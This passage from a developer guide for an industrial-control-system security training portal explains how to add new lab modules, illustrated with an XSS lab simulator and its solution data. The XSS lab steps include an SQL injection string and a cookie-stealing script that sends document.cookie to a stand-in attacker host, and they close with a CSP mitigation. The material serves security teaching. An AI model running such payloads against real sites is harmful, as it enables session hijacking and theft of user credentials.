SELECT id, username, role FROM users WHERE username = ? AND password = ?
-- Parameters: ["admin' OR '1'='1'", "anything"]
-- DB sees username = literal string "admin' OR '1'='1'" → no match → fail
```

---

## 13. How to Build a New Lab Based on This Pattern

To create a **new lab** (e.g., an XSS lab, or a Command Injection lab), follow these steps exactly:

### Step 1: Add Lab Metadata to `data/labs.js`

```js
// Add to the array in data/labs.js
{
  id: 21,                          // Pick the next unused ID
  slug: 'xss-attack',             // URL: /lab/xss-attack
  day: 3,                         // Which training day
  order: 6,                       // Order within the day
  title: 'Cross-Site Scripting (XSS)',
  category: 'Web Application',
  icon: 'code',                   // Any Tabler icon name
  difficulty: 'Intermediate',
  duration: '35 min',
  description: 'Inject malicious JavaScript into HMI web portals...',
  objectives: [
    'Understand reflected XSS',
    'Craft a working XSS payload',
    'Steal session cookies via XSS',
    'Apply Content-Security-Policy fixes'
  ],
  tools: ['Browser DevTools', 'XSS payloads', 'Burp Suite'],
  examDomain: 'ICS Web Application Security',
  sim: 'xss'                      // ← MUST match your new .ejs filename
}
```

### Step 2: Create the Simulator View `views/sims/xss.ejs`

Copy the structure of `sqli.ejs` and change the content:

```ejs
<div class="sim-wrap">
  <div class="sim-header">
    <h2>XSS — Interactive Lab</h2>
    <p>Follow the steps below to complete this CyberLive simulation.</p>
  </div>
  <div class="info-box info">
    <i class="ti ti-info-circle"></i> This is the <b>xss</b> lab module.
  </div>
  <div id="xss-steps"></div>

<script>
(function() {
  const LABS = {
    xss: {
      steps: [
        'Open the HMI comment field at http://192.168.1.100/hmi/alerts',
        'Test for reflection: enter <b>test</b> in the search field',
        'Confirm XSS: enter <script>alert(1)</script>',
        'Steal session: <script>fetch("//attacker.com?c="+document.cookie)</script>',
        'Fix: apply Content-Security-Policy header'
      ],
      cmds: [
        'curl http://192.168.1.100/hmi/alerts → page loads OK',
        'Enter: <b>test</b> → page shows "test" in bold → REFLECTED',
        '<script>alert(1)</script> → alert popup appears → XSS CONFIRMED',
        'Session cookie sent to attacker.com → token=eyJhbGci...',
        'CSP header: "default-src \'self\'; script-src \'none\'" → XSS blocked'
      ]
    }
  };

  const lab = LABS['xss'];
  if (!lab) return;
  const container = document.getElementById('xss-steps');
  lab.steps.forEach((step, i) => {
    const card = document.createElement('div');
    card.className = 'step-card-sim';
    card.style.cssText = 'background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:14px 16px;margin-bottom:10px';
    card.innerHTML = `
      <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px">
        <div style="width:26px;height:26px;border-radius:50%;border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;color:var(--muted);flex-shrink:0">${i+1}</div>
        <div style="font-size:14px;font-weight:600">${step}</div>
        <button onclick="runSimStep(this,${i},'xss')" style="margin-left:auto;padding:5px 14px;background:transparent;border:1px solid var(--border);border-radius:7px;color:var(--muted);font-size:12px;cursor:pointer;font-family:var(--sans);display:flex;align-items:center;gap:5px"><i class="ti ti-player-play"></i> Run</button>
      </div>
      <div style="background:#0d1117;border:1px solid var(--border);border-radius:8px;padding:10px 14px;font-family:var(--mono);font-size:12px;color:#8b949e" id="out-xss-${i}">
        <span style="color:#57ab5a">analyst@lab:~$ </span><span style="color:#e6edf3">${lab.cmds[i]}</span>
      </div>`;
    container.appendChild(card);
  });
})();

function runSimStep(btn, i, sim) {
  const out = document.getElementById('out-' + sim + '-' + i);
  btn.style.borderColor = 'var(--green)'; btn.style.color = 'var(--green)';
  btn.innerHTML = '<i class="ti ti-check"></i> Done';
  const results = {
    xss: [
      'Page loads, comment field visible',
      '<b>test</b> rendered as bold — input reflected in page',
      'Alert popup: XSS CONFIRMED',
      'Cookie: session=eyJ... sent to attacker server',
      'CSP applied: <script> tags blocked, XSS mitigated'
    ]
  };
  const r = (results[sim] || ['Step executed successfully'])[i] || 'Command executed successfully';
  setTimeout(() => {
    const result = document.createElement('div');
    result.style.cssText = 'margin-top:6px;color:#57ab5a;font-size:12px';
    result.textContent = '→ ' + r;
    out.appendChild(result);
  }, 400);
}
</script>
```

### Step 3: Add Solution Data to `data/solutions.js`

```js
// Add a new key inside module.exports = { ... }
'xss-attack': {
  title: 'Cross-Site Scripting (XSS)',
  summary: 'XSS allows attackers to inject JavaScript into web pages...',
  steps: [
    {
      step: 'Identify reflection point',
      type: 'recon',
      answer: 'Test input fields by entering harmless HTML like <b>test</b>...',
      cmd: `curl "http://192.168.1.100/hmi/alerts?q=<b>test</b>"`,
      result: 'Input reflected in HTML output — XSS vector confirmed.'
    },
    // ... more steps
  ],
  quiz: [
    {
      q: 'What is reflected XSS?',
      options: ['Stored in DB','Reflected back in HTTP response immediately','DOM-only','Server-side'],
      correct: 1,
      a: 'Reflected XSS occurs when user input is returned directly in the HTTP response...'
    }
  ]
}
```

### Step 4: That's It

The routing is **automatic**. Because `routes/lab.js` uses `labs.find(l => l.slug === req.params.slug)`, your new lab is automatically served at `/lab/xss-attack` without touching any router file.

---

## Summary Table — Every File in the System

| File | Role | What It Does for the SQLi Lab |
|------|------|-------------------------------|
| [`data/labs.js`](file:///Users/joshwa/Downloads/gicsp-portal/data/labs.js) | Lab registry | Defines `slug:'sql-injection'`, `sim:'sqli'`, metadata |
| [`routes/lab.js`](file:///Users/joshwa/Downloads/gicsp-portal/routes/lab.js) | Lab router | Handles GET /lab/sql-injection, POST /lab/sql-injection/complete |
| [`data/users.js`](file:///Users/joshwa/Downloads/gicsp-portal/data/users.js) | Progress store | In-memory `markStarted` / `markComplete` / `getProgress` |
| [`views/lab.ejs`](file:///Users/joshwa/Downloads/gicsp-portal/views/lab.ejs) | Shell template | Renders nav, sidebar, includes `sims/sqli.ejs` |
| [`views/sims/sqli.ejs`](file:///Users/joshwa/Downloads/gicsp-portal/views/sims/sqli.ejs) | **The Simulator** | LABS object, IIFE card builder, `runSimStep()` engine |
| [`routes.sqli-demo.js`](file:///Users/joshwa/Downloads/gicsp-portal/routes.sqli-demo.js) | Backend demo | Vulnerable + safe login routes, SQLite DB, audit logging |
| [`data/solutions.js`](file:///Users/joshwa/Downloads/gicsp-portal/data/solutions.js) | Solution guide | 5 steps with commands, explanations, 3 quiz questions |
| [`views/solution.ejs`](file:///Users/joshwa/Downloads/gicsp-portal/views/solution.ejs) | Solution view | Renders accordion steps + quiz from solutions.js data |
| [`app.js`](file:///Users/joshwa/Downloads/gicsp-portal/app.js) | Entry point | Sets up Express, EJS, session, mounts all routers |
| [`middleware.js`](file:///Users/joshwa/Downloads/gicsp-portal/middleware.js) | Guards | `requireAuth`, rate limiters, security headers |

---

> [!TIP]
> The fastest way to create a new lab: copy `views/sims/sqli.ejs`, change the `LABS` key name and content, add the entry to `data/labs.js`, and add the solution to `data/solutions.js`. Zero router changes needed.

> [!NOTE]
> The `runSimStep()` function is **not** inside the IIFE — it is declared globally so the `onclick` attributes in each card's HTML can call it. The IIFE only handles initial rendering.

> [!IMPORTANT]
> The backend (`routes.sqli-demo.js`) is a **separate, optional** layer from the frontend simulator. The `sqli.ejs` simulator works entirely in the browser and does NOT call the backend routes. The backend routes exist for instructors who want to demonstrate real HTTP-based SQL injection with curl.
